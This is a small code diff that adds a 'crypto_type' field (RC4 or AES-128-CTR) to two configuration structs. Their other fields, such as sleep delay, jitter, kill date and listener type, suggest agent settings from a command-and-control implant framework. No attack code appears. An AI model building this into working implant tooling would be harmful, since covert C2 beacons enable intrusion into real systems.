@@ -57,6 +57,7 @@ typedef struct {
 	ULONG label_size;   
 	ULONG ttl;          
 	BYTE* encrypt_key;  
+	ULONG crypto_type;  // 0 = RC4, 1 = AES-128-CTR
 	ULONG burst_enabled;
 	ULONG burst_sleep;
 	ULONG burst_jitter;
@@ -74,6 +75,7 @@ public:
 	ULONG agent_type;
 	ULONG listener_type;
 	BYTE* encrypt_key;
+	ULONG crypto_type;   // 0 = RC4, 1 = AES-128-CTR
 	ULONG sleep_delay;
 	ULONG jitter_delay;
 	ULONG kill_date;
